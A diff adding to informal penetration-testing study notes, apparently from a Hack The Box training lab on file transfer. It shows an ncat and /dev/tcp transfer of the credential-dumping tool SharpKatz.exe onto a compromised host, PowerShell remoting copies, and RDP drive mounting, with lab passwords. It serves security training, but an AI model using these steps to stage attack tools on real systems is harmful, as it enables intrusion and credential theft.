@@ -433,3 +433,41 @@ $sudo ncat -l -p 443 --send-only < SharpKatz.exe
 \\Compromised PC conn to Netcat Using /dev/tcp to Receive the File
 $cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
 NOTE: the same operation can be used to transfer files from the compromised host to our pwnbox
+\\PowerShell Session File Transfer
+incase HTTP, HTTPS, or SMB are unavailable. we can use PowerShell Remoting, aka WinRM, to perform file transfer oeprations.
+-PowerShell Remoting allows us to execute scripts or commands on a remote computer using Powershell sessions.
+bydefault enabling PS remoting creates both an HTTP and an HTTPS listener, the listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS
+-to create PS remoting session on a remote comp, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PS remoting in the session config 
+EX transfer a file from DC01 to DATABASE01 and vice versa
+-we have a session as Administrator in DC01 the user has administrative rights on DATABASE01, and PS remoting is enabled.
+let use Test-NetConnection to confirm we can connect to WinRM
+\\From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01
+$whoami >hostname> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+-because this session already has privileges over DATABASE01, we dont need to specify cred. in the ex below: a session is created to the remote comp named DATABASE01 and stores the result in the variable named $Session
+\\Create a PowerShell Remoting Session to DATABASE01
+$Session = New-PSSession -ComputerName DATABASE01
+-we can use the Compy-Item cmdlet to copy a file from our local machine DC01 to the DATABASE01 session we have $Session or vice versa
+\\Copy samplefile.txt from our Localhost to the DATABASE01 session
+$Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+\\Copy DATABASE.txt from DATABASE01 session to our Localhost
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+\\\\RDP
+use right click copy and paste it into RDP session
+-if we are conn from Linux we can use xfreerdp or rdesktop,at the time of writing it allow copy from our target machine to the RDP session, but there maybe scenarios where this may not work as expected
+-alternative t copy and paste, we can mount a local resource on target RDP server, rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session
+\\Mounting a Linux Folder Using rdesktop
+$rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+\\Mounting a Linux Folder Using xfreerdp
+$xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+-to access the dir we can conn to \\tsclient allow us to transfer files to and from the RDP session
+-alternative, from windows, the native mstsc.exe remote desktop client can be used
+-after selecting the drive, we can interact with it in the remote session that follows
+NOTE: this drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session
+<test>Use xfreerdp or rdesktop to connect to the target machine via RDP
+ (Username: htb-student | Password:HTB_@cademy_stdnt!) 
+and mount a Linux directory to practice file transfer operations (upload and download) with your attack host. Type "DONE" when finished.
+$xfreerdp /v:<ip> /u:htb-student /p:<password>
+>whoami>hostname> $Test-NetConnection -ComputerName <name> -Port 5985
+>$Session = New-PSSession -ComputerName <name>
+10.129.221.186 (window)  10.10.15.86 (linux)
+rdesktop 10.129.221.186 -d HTB -u htb-student -p 'HTB_@cademy_stdnt!' -r disk:linux='/home/htb-ac-1577360/Desktop/SharpKatz.exe'
